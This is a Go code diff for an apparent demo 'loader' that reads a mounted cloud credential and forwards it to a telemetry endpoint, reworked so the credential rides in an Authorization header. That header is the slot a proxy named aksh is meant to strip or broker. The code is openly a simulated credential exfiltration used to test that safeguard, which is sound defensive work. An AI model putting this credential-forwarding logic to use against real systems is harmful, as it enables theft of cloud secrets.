@@ -48,10 +48,14 @@ const (
 	defaultSummary   = "cloud credential handoff"
 )
 
-// Envelope is what gets POSTed to the telemetry endpoint. It reuses the
+// Envelope is the metadata POSTed to the telemetry endpoint. It reuses the
 // collector's accepted cluster_id/namespace/pod/summary/request_id wire schema
-// so a leak is a first-class event, and adds the verbatim stolen_credential the
-// collector displays (and decodes, if it is a JWT).
+// so a handoff is a first-class event. The credential itself is NOT in the
+// body: it travels in the `Authorization: Bearer` header (the slot aksh
+// sanitises/brokers), so that an aksh-allowed-but-unbrokered destination
+// receives the request with an empty credential. The optional stolen_credential
+// field is retained for the collector's display when the credential is not
+// carried in the header (e.g. an offline body-only path); it is empty here.
 type Envelope struct {
 	Schema      string `json:"schema"`
 	ClusterID   string `json:"cluster_id"`
@@ -61,10 +65,9 @@ type Envelope struct {
 	RequestID   string `json:"request_id"`
 	Tool        string `json:"tool"`
 	GeneratedAt string `json:"generated_at"`
-	// StolenCredential is the mounted credential, forwarded verbatim. This is
-	// intentional: aksh's job in the demo is to stop this from ever reaching an
-	// unapproved host.
-	StolenCredential string `json:"stolen_credential"`
+	// StolenCredential is intentionally omitted when empty: the credential is
+	// carried in the Authorization header so aksh can strip/broker it.
+	StolenCredential string `json:"stolen_credential,omitempty"`
 }
 
 // Config configures the loader.
@@ -110,39 +113,11 @@ func New(cfg Config) *Loader {
 	return &Loader{cfg: cfg}
 }
 
-// Build reads the credential from disk and returns the marshalled envelope
-// ready to upload. Nothing is read outside CredentialPath.
-func (l *Loader) Build() ([]byte, error) {
-	cred, err := l.read()
-	if err != nil {
-		return nil, err
-	}
-	id, err := l.cfg.randHex()
-	if err != nil {
-		return nil, fmt.Errorf("generate request id: %w", err)
-	}
-	env := Envelope{
-		Schema:           SchemaVersion,
-		ClusterID:        l.cfg.ClusterID,
-		Namespace:        l.cfg.Namespace,
-		Pod:              l.cfg.Pod,
-		Summary:          l.cfg.Summary,
-		RequestID:        id,
-		Tool:             ToolName,
-		GeneratedAt:      l.cfg.now().UTC().Format(time.RFC3339),
-		StolenCredential: cred,
-	}
-	encoded, err := json.Marshal(env)
-	if err != nil {
-		return nil, fmt.Errorf("encode credential envelope: %w", err)
-	}
-	if len(encoded) > MaxEnvelopeBytes {
-		return nil, fmt.Errorf("credential envelope exceeds %d byte collector limit", MaxEnvelopeBytes)
-	}
-	return encoded, nil
-}
-
-func (l *Loader) read() (string, error) {
+// ReadCredential reads and validates the mounted credential and returns it
+// verbatim (trailing whitespace trimmed). Nothing is read outside
+// CredentialPath. The caller sends it in the Authorization header so aksh can
+// strip/broker it.
+func (l *Loader) ReadCredential() (string, error) {
 	if l.cfg.CredentialPath == "" {
 		return "", errors.New("credential path is empty (set AKSH_DIAG_CREDENTIAL_PATH)")
 	}
@@ -171,6 +146,34 @@ func (l *Loader) read() (string, error) {
 		return "", errors.New("mounted credential is not valid UTF-8")
 	}
 	return cred, nil
+}
+
+// BuildEnvelope returns the marshalled metadata envelope (no credential in the
+// body — the credential travels in the Authorization header).
+func (l *Loader) BuildEnvelope() ([]byte, error) {
+	id, err := l.cfg.randHex()
+	if err != nil {
+		return nil, fmt.Errorf("generate request id: %w", err)
+	}
+	env := Envelope{
+		Schema:      SchemaVersion,
+		ClusterID:   l.cfg.ClusterID,
+		Namespace:   l.cfg.Namespace,
+		Pod:         l.cfg.Pod,
+		Summary:     l.cfg.Summary,
+		RequestID:   id,
+		Tool:        ToolName,
+		GeneratedAt: l.cfg.now().UTC().Format(time.RFC3339),
+		// StolenCredential omitted: it is carried in the Authorization header.
+	}
+	encoded, err := json.Marshal(env)
+	if err != nil {
+		return nil, fmt.Errorf("encode credential envelope: %w", err)
+	}
+	if len(encoded) > MaxEnvelopeBytes {
+		return nil, fmt.Errorf("credential envelope exceeds %d byte collector limit", MaxEnvelopeBytes)
+	}
+	return encoded, nil
 }
 
 func boundOr(s, def string) string {
